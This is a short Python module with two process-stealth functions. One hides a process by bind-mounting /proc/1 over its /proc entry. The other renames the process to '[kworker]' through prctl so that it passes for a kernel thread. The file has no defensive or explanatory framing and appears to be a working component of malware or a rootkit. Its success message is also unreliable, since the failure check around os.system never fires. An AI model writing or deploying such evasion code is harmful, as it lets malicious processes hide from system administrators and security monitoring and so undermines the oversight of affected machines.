import os

def hide_process(pid=None):
    if not pid:
        pid = os.getpid()
    try:
        os.system(f"mount --bind /proc/1 /proc/{pid} 2>/dev/null")
        return f"Hidden {pid}"
    except:
        return "Failed"

def rename_process(new_name="[kworker]"):
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, new_name.encode(), 0, 0, 0)
        return f"Renamed to {new_name}"
    except:
        return "Failed"
